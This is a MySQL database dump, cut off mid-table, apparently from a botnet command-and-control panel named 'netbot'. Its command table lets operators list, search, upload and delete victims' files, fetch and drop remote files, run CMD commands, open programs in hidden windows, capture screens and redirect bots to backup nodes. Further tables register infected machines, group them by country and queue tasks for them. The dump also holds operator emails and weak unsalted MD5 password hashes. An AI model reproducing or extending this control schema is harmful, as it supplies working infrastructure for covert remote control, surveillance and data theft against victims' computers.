/*
Navicat MySQL Data Transfer

Source Server         : localhost
Source Server Version : 50612
Source Host           : localhost:3306
Source Database       : bot

Target Server Type    : MYSQL
Target Server Version : 50612
File Encoding         : 65001

Date: 2015-07-14 10:37:01
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for app
-- ----------------------------
DROP TABLE IF EXISTS `app`;
CREATE TABLE `app` (
  `app_id` int(11) NOT NULL AUTO_INCREMENT,
  `app_type` varchar(20) DEFAULT NULL COMMENT '指令类型',
  `app_help` varchar(255) DEFAULT NULL COMMENT '指令说明',
  `app_vars` text COMMENT '指令表单参数',
  `app_fun` varchar(50) DEFAULT NULL COMMENT '指令英文主标识',
  `app_name` varchar(50) DEFAULT NULL COMMENT '指令名称',
  `app_isback` int(2) DEFAULT '1' COMMENT '默认是否返回',
  `app_backfun` varchar(50) DEFAULT NULL COMMENT '默认回调函数',
  `app_stauts` int(2) DEFAULT '0' COMMENT '启用状态',
  `app_plugurl` varchar(100) DEFAULT NULL COMMENT '插件下载地址',
  `app_plugmd5` varchar(40) DEFAULT NULL COMMENT '插件MD5值',
  PRIMARY KEY (`app_id`)
) ENGINE=MyISAM AUTO_INCREMENT=27 DEFAULT CHARSET=utf8 COMMENT='插件指令表';

-- ----------------------------
-- Records of app
-- ----------------------------
INSERT INTO `app` VALUES ('1', 'netbot', '获取包含盘符及其根目录的文件列表，以及包含桌面，我的文档等常用路径根目录列表。参数无需填写。', '', 'treeList', '获取整机目录树', null, 'Treelist', '1', '', '');
INSERT INTO `app` VALUES ('2', 'netbot', '路径参数必填！路径中使用“/”!例子：c:/aaa', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"路径\",\"formdata\":null}]}', 'pathList', '指定路径的文件列表', null, 'Pathlist', '1', '', '');
INSERT INTO `app` VALUES ('3', 'netbot', '【路径】【关键词】为必填项！限制后缀名为选填项。', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"路径\",\"formdata\":\"c:/\"},{\"formtype\":\"text\",\"formname\":\"search\",\"formtitle\":\"关键字\",\"formdata\":null},{\"formtype\":\"select\",\"formname\":\"is_content\",\"formtitle\":\"搜索内容\",\"formdata\":{\"0\":\"否\",\"1\":\"是\"}},{\"formtype\":\"select\",\"formname\":\"is_case\",\"formtitle\":\"大小写区分\",\"formdata\":{\"0\":\"否\",\"1\":\"是\"}},{\"formtype\":\"text\",\"formname\":\"ext\",\"formtitle\":\"限制后缀名\",\"formdata\":\"txt\"}]}', 'search', '从指定路径搜索', null, 'Wait', '1', '', '');
INSERT INTO `app` VALUES ('4', 'netbot', '路径参数必填！路径中使用“/”!例子：c:/aaa/1.zip', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"文件路径\",\"formdata\":null}]}', 'fileUpload', '上传文件', null, '', '1', '', '');
INSERT INTO `app` VALUES ('5', 'netbot', '【公网路径】为必填项！例子：http://www.xxx.com/xxx.zip<br>【下载到路径】为必填项！例子：c:/xxx/xxx2.zip', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"公网路径\",\"formdata\":null},{\"formtype\":\"text\",\"formname\":\"download_to\",\"formtitle\":\"下载到路径\",\"formdata\":null}]}', 'fileDownload', '下载文件', null, '', '1', '', '');
INSERT INTO `app` VALUES ('6', 'netbot', '【路径】参数必填！路径中使用“/”!例子：c:/aaa', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"路径\",\"formdata\":null}]}', 'mkdir', '新建文件夹', null, '', '1', '', '');
INSERT INTO `app` VALUES ('7', 'exe', '【留空备用暂不删】', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"路径\",\"formdata\":null},{\"formtype\":\"textarea\",\"formname\":\"filestr\",\"formtitle\":\"内容\",\"formdata\":null}]}', 'mkfile', '【留空备用暂不删】', null, '', '0', '', '');
INSERT INTO `app` VALUES ('8', 'netbot', '【路径列表】中至少填写一条数据！<br />注意属性和文件路径保持一致！', '{\"data\":[{\"formtype\":\"pathlist\",\"formname\":\"list\",\"formtitle\":\"路径列表\",\"formdata\":null}]}', 'pathDelete', '删除文件', null, '', '1', '', '');
INSERT INTO `app` VALUES ('9', 'netbot', '【路径】参数必填！路径中使用“/”!例子：c:/aaa/1.txt', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"路径\",\"formdata\":null}]}', 'fileRead', '读取文件', null, 'Wait', '1', '', '');
INSERT INTO `app` VALUES ('10', 'netbot', '【路径】参数必填！路径中使用“/”!例子：c:/aaa<br />【内容】选填，为空是建立空内容文件。', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"保存路径\",\"formdata\":null},{\"formtype\":\"text\",\"formname\":\"charset\",\"formtitle\":\"保存编码\",\"formdata\":\"utf-8\"},{\"formtype\":\"textarea\",\"formname\":\"filestr\",\"formtitle\":\"内容\",\"formdata\":null}]}', 'fileSave', '保存文件', null, 'Wait', '1', '', '');
INSERT INTO `app` VALUES ('11', 'netbot', '【压缩到的路径】为选填项，留空为压缩到第一个路径目录。<br />【路径列表】中至少填写一条数据！<br />注意属性和文件路径保持一致！', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"压缩到的路径\",\"formdata\":null},{\"formtype\":\"pathlist\",\"formname\":\"list\",\"formtitle\":\"路径列表\",\"formdata\":null}]}', 'zip', '压缩文件', null, '', '1', 'http://www.bot.com/taskdata/plug/zip', 'dd80df05d29f5a35b1c1827aed733467');
INSERT INTO `app` VALUES ('12', 'netbot', '【源路径】【新路径】都为必填项！', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"源路径\",\"formdata\":null},{\"formtype\":\"text\",\"formname\":\"rname_to\",\"formtitle\":\"新路径\",\"formdata\":null}]}', 'pathRname', '重命名', null, '', '1', '', '');
INSERT INTO `app` VALUES ('13', 'netbot', '【源文件】为必填项！如：c:/1.zip<br />【解压到路径】选填，留空为解压缩到当前路径', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"源文件\",\"formdata\":null},{\"formtype\":\"text\",\"formname\":\"unzip_to\",\"formtitle\":\"解压到路径\",\"formdata\":null}]}', 'unzip', '解压缩文件到路径', null, '', '1', 'http://www.bot.com/taskdata/plug/zip', 'dd80df05d29f5a35b1c1827aed733467');
INSERT INTO `app` VALUES ('14', 'netbot', '【粘贴到的路径】为必填项！如：c:/aaa<br />【路径列表】中至少填写一条数据！注意属性和文件路径保持一致！', '{\"data\":[{\"formtype\":\"select\",\"formname\":\"copy_type\",\"formtitle\":\"剪切还是拷贝\",\"formdata\":{\"cut\":\"剪切\",\"copy\":\"拷贝\"}},{\"formtype\":\"text\",\"formname\":\"path_past\",\"formtitle\":\"粘贴到的路径\",\"formdata\":null},{\"formtype\":\"pathlist\",\"formname\":\"list\",\"formtitle\":\"路径列表\",\"formdata\":null}]}', 'pathPast', '剪切和粘贴', null, '', '1', '', '');
INSERT INTO `app` VALUES ('15', 'netbot', '【压缩到的路径】为选填项，留空为压缩到第一个路径目录。<br />【路径列表】中至少填写一条数据！<br />注意属性和文件路径保持一致！', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"压缩到的路径\",\"formdata\":null},{\"formtype\":\"pathlist\",\"formname\":\"list\",\"formtitle\":\"路径列表\",\"formdata\":null}]}', 'zipUpload', '先压缩再上传', null, '', '1', 'http://www.bot.com/taskdata/plug/zip', 'dd80df05d29f5a35b1c1827aed733467');
INSERT INTO `app` VALUES ('16', 'netbot', '【等待结果】控制是否等待命令执行完并返回结果。<br />【超时时间】必填项！最长等待结果时间，单位：秒。<br />【CMD命令】必填项！', '{\"data\":[{\"formtype\":\"select\",\"formname\":\"iswait\",\"formtitle\":\"等待结果\",\"formdata\":{\"1\":\"是\",\"0\":\"否\"}},{\"formtype\":\"text\",\"formname\":\"timeout\",\"formtitle\":\"超时时间\",\"formdata\":60},{\"formtype\":\"textarea\",\"formname\":\"command\",\"formtitle\":\"CMD命令\",\"formdata\":null}]}', 'cmd', 'CMD命令执行', null, 'Wait', '1', '', '');
INSERT INTO `app` VALUES ('17', 'netbot', '【文件路径】必填项！<br />【参数】选填！', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"path\",\"formtitle\":\"文件路径\",\"formdata\":null},{\"formtype\":\"text\",\"formname\":\"command\",\"formtitle\":\"附加参数\",\"formdata\":null},{\"formtype\":\"select\",\"formname\":\"mode\",\"formtitle\":\"窗口模式\",\"formdata\":{\"0\":\"隐藏\",\"1\":\"正常\",\"2\":\"最大化\",\"3\":\"最小化\"}}]}', 'open', '远程打开文件', null, '', '1', '', '');
INSERT INTO `app` VALUES ('18', 'netbot', '三项中本次不改变的请留空！<br />【心跳间隔】10秒<填写值<10万秒', '{\"data\":[{\"formtype\":\"selectdb\",\"formname\":\"nb_url\",\"formtitle\":\"主节点\",\"formdata\":\"node\"},{\"formtype\":\"selectdb\",\"formname\":\"nb_url_bak\",\"formtitle\":\"备用节点\",\"formdata\":\"node\"},{\"formtype\":\"text\",\"formname\":\"nb_interval\",\"formtitle\":\"心跳间隔[秒]\",\"formdata\":null}]}', 'setconfig', '设置上线地址和心跳时间', null, 'Setconfig', '1', '', '');
INSERT INTO `app` VALUES ('19', 'netbot', '500毫秒<间隔时间<10万毫秒', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"interval\",\"formtitle\":\"间隔时间\",\"formdata\":\"500\"}]}', 'startchat', '进入激活状态', null, 'Startchat', '1', '', '');
INSERT INTO `app` VALUES ('20', 'netbot', '', '', 'endchat', '停止激活状态', null, 'Endchat', '1', '', '');
INSERT INTO `app` VALUES ('21', 'netbot', '', '{\"data\":[{\"formtype\":\"text\",\"formname\":\"interval\",\"formtitle\":\"间隔小时\",\"formdata\":\"100\"}]}', 'sleep', '进入静默状态', null, 'Sleep', '1', '', '');
INSERT INTO `app` VALUES ('24', 'netbot', '', '{\"data\":[{\"formtype\":\"select\",\"formname\":\"digit\",\"formtitle\":\"图像质量\",\"formdata\":{\"8\":\"8位\",\"1\":\"1位\",\"4\":\"4位\",\"24\":\"24位\"}}]}', 'screen', '抓屏', '1', 'Screen', '1', '', '');
INSERT INTO `app` VALUES ('25', 'netbot', '', '', 'addmouse', 'addmouse', '1', 'Screen', '0', '', '');
INSERT INTO `app` VALUES ('26', 'netbot', '', '', 'addkeyboard', 'addkeyboard', '1', 'Screen', '0', '', '');

-- ----------------------------
-- Table structure for chatlist
-- ----------------------------
DROP TABLE IF EXISTS `chatlist`;
CREATE TABLE `chatlist` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `guid` varchar(50) DEFAULT NULL COMMENT '机器GUID',
  `name` varchar(50) DEFAULT NULL COMMENT '机器自定义名称',
  `cname` varchar(100) DEFAULT NULL COMMENT '机器计算机名',
  `username` varchar(50) DEFAULT NULL COMMENT '激活用户',
  `lasttime` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '数据更新时间',
  `stauts` int(2) DEFAULT '0' COMMENT '状态[0:创建,1:已激活]',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='激活主机列表';

-- ----------------------------
-- Records of chatlist
-- ----------------------------

-- ----------------------------
-- Table structure for groups
-- ----------------------------
DROP TABLE IF EXISTS `groups`;
CREATE TABLE `groups` (
  `ng_id` int(11) NOT NULL AUTO_INCREMENT,
  `ng_name` varchar(50) DEFAULT NULL COMMENT '分组名称',
  `ng_type` varchar(50) DEFAULT NULL COMMENT '分组类型  主分组  扩展分组',
  PRIMARY KEY (`ng_id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='分组列表';

-- ----------------------------
-- Records of groups
-- ----------------------------
INSERT INTO `groups` VALUES ('1', '默认分组', 'main');
INSERT INTO `groups` VALUES ('2', 'USA', 'main');
INSERT INTO `groups` VALUES ('4', '300', 'expand');
INSERT INTO `groups` VALUES ('5', 'TEST', 'expand');
INSERT INTO `groups` VALUES ('6', '318', 'main');
INSERT INTO `groups` VALUES ('7', 'Russia', 'expand');

-- ----------------------------
-- Table structure for login_log
-- ----------------------------
DROP TABLE IF EXISTS `login_log`;
CREATE TABLE `login_log` (
  `ll_id` int(11) NOT NULL AUTO_INCREMENT,
  `ll_username` varchar(50) NOT NULL COMMENT '登录名',
  `ll_addtime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '操作时间',
  `ll_ip` varchar(50) NOT NULL COMMENT '登录IP',
  PRIMARY KEY (`ll_id`)
) ENGINE=MyISAM AUTO_INCREMENT=16 DEFAULT CHARSET=utf8 COMMENT='管理员登录日志';

-- ----------------------------
-- Records of login_log
-- ----------------------------
INSERT INTO `login_log` VALUES ('1', 'admin', '2015-07-10 20:18:40', '127.0.0.1');
INSERT INTO `login_log` VALUES ('2', 'admin', '2015-07-11 07:44:42', '127.0.0.1');
INSERT INTO `login_log` VALUES ('3', 'admin', '2015-07-11 10:17:59', '127.0.0.1');
INSERT INTO `login_log` VALUES ('4', 'admin', '2015-07-11 20:03:53', '192.168.19.150');
INSERT INTO `login_log` VALUES ('5', 'admin', '2015-07-11 20:13:05', '192.168.19.150');
INSERT INTO `login_log` VALUES ('6', 'admin', '2015-07-11 20:17:38', '127.0.0.1');
INSERT INTO `login_log` VALUES ('7', 'admin', '2015-07-12 13:35:12', '127.0.0.1');
INSERT INTO `login_log` VALUES ('8', 'admin', '2015-07-13 09:13:26', '127.0.0.1');
INSERT INTO `login_log` VALUES ('9', 'admin', '2015-07-13 17:53:34', '192.168.31.113');
INSERT INTO `login_log` VALUES ('10', 'admin', '2015-07-13 21:28:41', '127.0.0.1');
INSERT INTO `login_log` VALUES ('11', 'admin', '2015-07-14 09:04:18', '127.0.0.1');
INSERT INTO `login_log` VALUES ('12', 'alwin', '2015-07-14 10:22:08', '127.0.0.1');
INSERT INTO `login_log` VALUES ('13', 'admin', '2015-07-14 10:22:28', '127.0.0.1');
INSERT INTO `login_log` VALUES ('14', 'alwin', '2015-07-14 10:22:45', '127.0.0.1');
INSERT INTO `login_log` VALUES ('15', 'admin', '2015-07-14 10:27:19', '192.168.31.113');

-- ----------------------------
-- Table structure for member
-- ----------------------------
DROP TABLE IF EXISTS `member`;
CREATE TABLE `member` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(100) NOT NULL COMMENT '用户名',
  `password` varchar(100) NOT NULL COMMENT '登录密码',
  `role` varchar(100) NOT NULL COMMENT '权限[超级管理员|操作员]',
  `lasttime` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '最后登陆时间',
  `lastip` varchar(100) DEFAULT NULL COMMENT '最后登录IP',
  `grouplist` varchar(255) DEFAULT NULL COMMENT '权限组',
  `grouplist_name` varchar(255) DEFAULT NULL COMMENT '权限组可视数据，方便列表查看时理解',
  `email` varchar(100) DEFAULT NULL COMMENT '用户EMAIL',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='用户列表';

-- ----------------------------
-- Records of member
-- ----------------------------
INSERT INTO `member` VALUES ('1', 'admin', '21232f297a57a5a743894a0e4a801fc3', 'administrator', '2015-07-06 10:22:21', '', null, null, '40700507@qq.com');
INSERT INTO `member` VALUES ('2', 'alwin', 'e10adc3949ba59abbe56e057f20f883e', 'user', '2015-07-07 16:17:47', '', '[\"1\",\"5\"]', '【默认分组】【TEST】', 'mengyuan5@163.com');
INSERT INTO `member` VALUES ('4', 'gejun', 'b206e95a4384298962649e58dc7b39d4', 'user', '2015-07-07 12:26:05', '', '[\"5\"]', '【TEST】', 'gz218@qq.com');

-- ----------------------------
-- Table structure for netbot
-- ----------------------------
DROP TABLE IF EXISTS `netbot`;
CREATE TABLE `netbot` (
  `nb_id` int(11) NOT NULL AUTO_INCREMENT,
  `nb_vid` varchar(20) DEFAULT NULL COMMENT '终端版本号',
  `nb_cname` varchar(50) DEFAULT NULL COMMENT '机器计算机名',
  `nb_name` varchar(50) DEFAULT NULL COMMENT '自定义标识名',
  `nb_inf` varchar(50) DEFAULT NULL COMMENT '备注',
  `nb_guid` varchar(40) NOT NULL COMMENT '机器GUID',
  `nb_addtime` timestamp NULL DEFAULT NULL COMMENT '机器注册时间',
  `nb_lasttime` timestamp NULL DEFAULT NULL COMMENT '机器最后通讯时间',
  `nb_lasturl` varchar(100) DEFAULT NULL COMMENT '机器最后通讯节点',
  `nb_lastip` varchar(20) DEFAULT NULL COMMENT '机器最后通讯IP',
  `nb_lasttype` varchar(10) DEFAULT NULL COMMENT '机器最后通讯类型',
  `nb_group` int(7) DEFAULT NULL COMMENT '机器主分组',
  `nb_task_new` int(2) DEFAULT NULL COMMENT '是否有任务数据',
  `nb_vm` int(2) DEFAULT NULL COMMENT '是否虚拟机',
  `nb_area` varchar(50) DEFAULT NULL COMMENT '机器所在地区',
  `nb_os` varchar(50) DEFAULT NULL COMMENT '机器操作系统',
  `nb_cpu` varchar(100) DEFAULT NULL COMMENT '机器CPU',
  `nb_amd64` int(2) DEFAULT NULL COMMENT '是否64位',
  `nb_mem` int(7) DEFAULT NULL COMMENT '机器内存大小',
  `nb_mac` varchar(50) DEFAULT NULL COMMENT '机器MAC',
  `nb_internet` varchar(10) DEFAULT NULL COMMENT '机器网络类型',
  `nb_stauts_val` varchar(10) DEFAULT NULL COMMENT '最后状态变更值',
  `nb_interval` int(7) DEFAULT '300' COMMENT '心跳包间隔',
  `nb_stauts` int(2) NOT NULL DEFAULT '1' COMMENT '机器状态【0:断开1正常2激活3静默】',
  `nb_url` varchar(100) DEFAULT NULL COMMENT '主节点',
  `nb_url_bak` varchar(100) DEFAULT NULL COMMENT '备用节点',
  `nb_reg` int(2) DEFAULT '0',
  PRIMARY KEY (`nb_id`),
  UNIQUE KEY `nb_guid` (`nb_guid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='机器列表';

-- ----------------------------
-- Records of netbot
-- ----------------------------
INSERT INTO `netbot` VALUES ('1', 'my201506', 'ALWIN-WIN7', null, null, 'c4666dbb92420e9bb650906ae60cdc21', '2015-07-12 18:35:30', '2015-07-13 22:41:26', 'www.bot.com', '127.0.0.1', null, '1', '0', '0', 'unknown', '6.1', 'Intel(R) Core(TM) i7-4800MQ CPU @ 2.70GHz', '1', '16087', '5E514F804FDF', '18', '500', '20', '0', 'www.bot.com', 'www.bot.com', '0');
INSERT INTO `netbot` VALUES ('2', 'my201506', 'TIANDASERVER', 'SVN', null, '114e249d89be372fbcc215a098bba874', '2015-07-14 09:31:36', '2015-07-14 10:36:53', 'www.bot.com', '192.168.31.111', null, '1', '0', '0', 'unknown', '6.1', 'Intel(R) Core(TM) i3-2130 CPU @ 3.40GHz', '1', '7103', '902B34D14962', '18', '1000', '10', '1', 'www.bot.com', 'www.bot.com', '0');

-- ----------------------------
-- Table structure for netbot_group_expand
-- ----------------------------
DROP TABLE IF EXISTS `netbot_group_expand`;
CREATE TABLE `netbot_group_expand` (
  `nge_id` int(11) NOT NULL AUTO_INCREMENT,
  `nge_netbot_id` varchar(50) NOT NULL COMMENT '机器GUID',
  `nge_group_id` int(11) NOT NULL COMMENT '机器扩展分组ID',
  PRIMARY KEY (`nge_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='机器扩展组记录';

-- ----------------------------
-- Records of netbot_group_expand
-- ----------------------------

-- ----------------------------
-- Table structure for netbot_robot
-- ----------------------------
DROP TABLE IF EXISTS `netbot_robot`;
CREATE TABLE `netbot_robot` (
  `id` int(7) NOT NULL AUTO_INCREMENT,
  `guid` varchar(40) NOT NULL COMMENT '机器GUID',
  `robot` varchar(50) NOT NULL COMMENT '扩展机器人名',
  `addtime` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '安装时间',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='扩展机器人安装记录';

-- ----------------------------
-- Records of netbot_robot
-- ----------------------------

-- ----------------------------
-- Table structure for netbot_task
-- ----------------------------
DROP TABLE IF EXISTS `netbot_task`;
CREATE TABLE `netbot_task` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `taskid` int(7) NOT NULL COMMENT '任务ID',
  `guid` varchar(40) NOT NULL COMMENT '机器GUID',
  `lasttime` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '最后执行时间',
  `hash` varchar(40) DEFAULT NULL COMMENT '最后执行版本HASH',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COMMENT='机器计划任务记录';

-- ----------------------------
-- Records of netbot_task
-- ----------------------------
INSERT INTO `netbot_task` VALUES ('2', '2', '9de5f97ef4e078cc1e3b6f975133a168', '2015-07-09 21:09:20', '1');
INSERT INTO `netbot_task` VALUES ('3', '1', '9de5f97ef4e078cc1e3b6f975133a168', '2015-07-11 12:36:27', '');
INSERT INTO `netbot_task` VALUES ('4', '1', '9de5f97ef4e078cc1e3b6f975133a168', '2015-07-11 15:08:36', '1');
INSERT INTO `netbot_task` VALUES ('5', '2', '9de5f97ef4e078cc1e3b6f975133a168', '2015-07-11 15:11:46', '32432');
INSERT INTO `netbot_task` VALUES ('6', '1', 'c4666dbb92420e9bb650906ae60cdc21', '2015-07-13 22:03:57', '1');
INSERT INTO `netbot_task` VALUES ('7', '1', '114e249d89be372fbcc215a098bba874', '2015-07-14 09:31:48', '1');

-- ----------------------------
-- Table structure for node
-- ----------------------------
DROP TABLE IF EXISTS `node`;
CREATE TABLE `node` (
  `id` int(7) NOT NULL AUTO_INCREMENT,
  `url` varchar(100) NOT NULL COMMENT '地址',
  `status` int(2) DEFAULT '1' COMMENT '启用状态',
  `name` varchar(100) NOT NULL COMMENT '名称',
  `inf` varchar(255) DEFAULT NULL COMMENT '备注',
  `addtime` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='网络节点列表';

-- ----------------------------
-- Records of node
-- ----------------------------
INSERT INTO `node` VALUES ('1', 'www.bot.com', '1', '默认', '', '2015-07-09 07:21:47');
INSERT INTO `node` VALUES ('2', 'www.usa.com', '1', '美国', '', '2015-07-09 07:21:45');
INSERT INTO `node` VALUES ('3', '222.222.222.222', '1', '香港', '', '2015-07-09 07:32:56');

-- ----------------------------
-- Table structure for task
-- ----------------------------
DROP TABLE IF EXISTS `task`;
CREATE TABLE `task` (
  `t_id` int(11) NOT NULL AUTO_INCREMENT,
  `t_name` varchar(100) DEFAULT NULL COMMENT '任务名称',
  `t_inf` varchar(200) DEFAULT NULL COMMENT '任务说明',
  `t_stauts` int(2) DEFAULT '0' COMMENT '任务启用状态',
  `t_starttime` timestamp NULL DEFAULT NULL COMMENT '开始时间',
  `t_endtime` timestamp NULL DEFAULT NULL COMMENT '结束时间',
  `t_addtime` timestamp NULL DEFAULT NULL COMMENT '创建时间',
  `t_group` varchar(200) DEFAULT NULL COMMENT '影响域【组列表或单机GUID】',
  `t_group_name` varchar(200) DEFAULT NULL COMMENT '影响域标识名【便于查看时理解】',
  `t_interval` int(7) DEFAULT '0' COMMENT '任务重复执行时间隔值【小时】',
  `t_hour` int(7) DEFAULT '0',
  `t_os_type` int(2) DEFAULT '0' COMMENT '过滤操作系统【0不过滤1包含2排除】',
  `t_os` varchar(100) DEFAULT NULL COMMENT '操作系统列表',
  `t_url_type` int(2) DEFAULT '0' COMMENT '过滤节点【0不过滤1包含2排除】',
  `t_url` varchar(200) DEFAULT NULL COMMENT '节点列表',
  `t_cpu` varchar(100) DEFAULT NULL,
  `t_mem` int(7) DEFAULT NULL,
  `t_area_type` int(2) DEFAULT '0' COMMENT '过滤地区【0不过滤1包含2排除】',
  `t_area` text COMMENT '地区列表',
  `t_hash` varchar(50) DEFAULT NULL COMMENT '任务版本HASH',
  `t_finish_num` int(7) DEFAULT '0' COMMENT '任务累计触发数',
  `t_netbot` int(2) DEFAULT '0' COMMENT '任务类型【0全局1组2单机】',
  `t_repeat` int(2) DEFAULT '0' COMMENT '是否重复执行',
  `t_isback` int(2) DEFAULT '1' COMMENT '是否返回结果',
  `t_backfun` varchar(50) DEFAULT NULL COMMENT '回调函数',
  `t_app` varchar(50) DEFAULT NULL COMMENT '调用插件类型',
  `t_function` varchar(50) DEFAULT NULL COMMENT '指令名',
  `t_vars` text COMMENT '指令参数',
  `t_plug_url` varchar(100) DEFAULT NULL COMMENT '插件下载地址',
  `t_plug_md5` varchar(50) DEFAULT NULL COMMENT '插件MD5',
  `username` varchar(50) DEFAULT NULL COMMENT '创建人',
  PRIMARY KEY (`t_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='智能计划任务列表';

-- ----------------------------
-- Records of task
-- ----------------------------

-- ----------------------------
-- Table structure for taskdata_chat
-- ----------------------------
DROP TABLE IF EXISTS `taskdata_chat`;
CREATE TABLE `taskdata_chat` (
  `id` int(11) NOT NULL COMMENT '队列ID',
  `tl_data` mediumtext COMMENT '队列结果',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='即时队列结果';

-- ----------------------------
-- Records of taskdata_chat
-- ----------------------------

-- ----------------------------
-- Table structure for taskdata_cron
-- ----------------------------
DROP TABLE IF EXISTS `taskdata_cron`;
CREATE TABLE `taskdata_cron` (
  `id` int(11) NOT NULL COMMENT '队列ID',
  `tl_data` longtext COMMENT '队列结果',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='计划队列结果';

-- ----------------------------
-- Records of taskdata_cron
-- ----------------------------

-- ----------------------------
-- Table structure for tasklist_chat
-- ----------------------------
DROP TABLE IF EXISTS `tasklist_chat`;
CREATE TABLE `tasklist_chat` (
  `tl_id` int(11) NOT NULL AUTO_INCREMENT,
  `tl_netbot` varchar(50) DEFAULT NULL COMMENT '机器GUID',
  `tl_taskid` int(11) DEFAULT NULL COMMENT '任务ID',
  `tl_addtime` timestamp NULL DEFAULT NULL COMMENT '创建时间',
  `tl_sendtime` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `tl_finishtime` timestamp NULL DEFAULT NULL COMMENT '完成时间',
  `tl_stauts` int(2) DEFAULT NULL COMMENT '0创建 1 推送 2 完成',
  `tl_isback` int(2) DEFAULT NULL COMMENT '是否返回',
  `tl_backfun` varchar(50) DEFAULT NULL COMMENT '回调函数',
  `tl_app` varchar(50) DEFAULT NULL COMMENT '指令类型',
  `tl_function` varchar(50) DEFAULT NULL COMMENT '指令名',
  `tl_plug_md5` varchar(50) DEFAULT NULL COMMENT '插件MD5',
  `tl_plug_url` varchar(100) DEFAULT NULL COMMENT '插件下载地址',
  `tl_vars` mediumtext COMMENT '指令参数',
  `tl_hash` varchar(50) DEFAULT NULL COMMENT '任务HASH',
  `tl_type` varchar(50) DEFAULT NULL COMMENT '请求类型',
  `tl_oldpath` varchar(255) DEFAULT NULL COMMENT '文件原路径',
  `tl_filename` varchar(255) DEFAULT NULL COMMENT '文件中转站路径',
  `tl_code` int(2) DEFAULT '0' COMMENT '执行结果状态',
  `tl_info` varchar(50) DEFAULT NULL COMMENT '执行结果信息',
  `username` varchar(50) DEFAULT NULL COMMENT '用户名',
  PRIMARY KEY (`tl_id`),
  KEY `tl_netbot` (`tl_netbot`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='即时队列';

-- ----------------------------
-- Records of tasklist_chat
-- ----------------------------

-- ----------------------------
-- Table structure for tasklist_cron
-- ----------------------------
DROP TABLE IF EXISTS `tasklist_cron`;
CREATE TABLE `tasklist_cron` (
  `tl_id` int(11) NOT NULL AUTO_INCREMENT,
  `tl_netbot` varchar(50) DEFAULT NULL,
  `tl_taskid` int(11) DEFAULT NULL,
  `tl_addtime` timestamp NULL DEFAULT NULL,
  `tl_sendtime` timestamp NULL DEFAULT NULL,
  `tl_finishtime` timestamp NULL DEFAULT NULL,
  `tl_stauts` int(2) DEFAULT NULL COMMENT '0创建 1 推送 2 完成',
  `tl_isback` int(2) DEFAULT NULL,
  `tl_backfun` varchar(50) DEFAULT NULL,
  `tl_app` varchar(50) DEFAULT NULL,
  `tl_function` varchar(50) DEFAULT NULL,
  `tl_plug_md5` varchar(50) DEFAULT NULL,
  `tl_plug_url` varchar(100) DEFAULT NULL,
  `tl_vars` mediumtext,
  `tl_hash` varchar(50) DEFAULT NULL,
  `tl_type` varchar(50) DEFAULT NULL,
  `tl_oldpath` varchar(255) DEFAULT NULL,
  `tl_filename` varchar(255) DEFAULT NULL,
  `tl_code` int(2) DEFAULT '0',
  `tl_info` varchar(50) DEFAULT NULL,
  `username` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`tl_id`),
  KEY `tl_netbot` (`tl_netbot`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='计划队列【字段详情同tasklist_chat】';

-- ----------------------------
-- Records of tasklist_cron
-- ----------------------------

-- ----------------------------
-- Table structure for task_files
-- ----------------------------
DROP TABLE IF EXISTS `task_files`;
CREATE TABLE `task_files` (
  `tf_id` int(11) NOT NULL AUTO_INCREMENT,
  `tf_name` varchar(255) DEFAULT NULL COMMENT '文件名',
  `tf_addtime` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP COMMENT '上传时间',
